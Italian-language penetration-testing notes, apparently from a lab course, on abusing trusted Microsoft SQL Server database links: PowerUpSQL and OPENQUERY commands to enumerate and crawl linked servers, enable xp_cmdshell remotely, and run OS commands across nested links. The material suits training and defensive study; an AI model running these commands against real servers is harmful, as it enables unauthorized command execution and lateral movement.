# Trust Abuse - MSSQL Servers - Database Links

* Un database link permette a un SQL Server di accedere source data esterni come altri SQL Server e OLE DB
* In caso di database link tra SQL Server, chiamate _Linked SQL Servers,_ e' possibile eseguire stored procedure
* I database link funzionano persino tra forest trust

#### Ricerca Link Database

```powershell
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```

Oppure

```sql
select * from master..sysservers
```

Oppure e' possibile enumerare manualmente i database link, usando Openquery(), per eseguire query sui linked database

```sql
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

#### Enumerare Database Link

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```

Oppure e' sempre possibile utilizzare Openquery()  per fare chaining (nested database links)

```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-
mgmt",''select * from master..sysservers'')')
```

#### Executing Commands

* Sul target server devono essere gia abilitati xp\_cmdshell o se rpcout e'abilitato (disabilitato di default), xp\_cmdshell puo essere abilitato utilizzando

```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

* Utilizzare il parametro -QueryTarget per eseguire query su istanze specifiche (senza l'attributo -QueryTarget il comando prova a utilzzare xp\_cmdshell su ogni link della chain)

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
```

Oppure dal SQL server iniziale, i comandi OS possono essere eseguiti utilizzando nested link queries:

```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-
mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select
@@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```
